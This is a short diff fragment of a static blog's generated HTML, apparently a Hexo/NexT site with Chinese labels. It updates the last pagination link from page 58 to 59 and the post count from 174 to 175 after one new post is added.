-    <a class="extend prev" rel="prev" href="/page/23/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/23/">23</a><span class="page-number current">24</span><a class="page-number" href="/page/25/">25</a><span class="space">&hellip;</span><a class="page-number" href="/page/58/">58</a><a class="extend next" rel="next" href="/page/25/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/23/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/23/">23</a><span class="page-number current">24</span><a class="page-number" href="/page/25/">25</a><span class="space">&hellip;</span><a class="page-number" href="/page/59/">59</a><a class="extend next" rel="next" href="/page/25/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -688,7 +662,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">174</span>
+          <span class="site-state-item-count">175</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
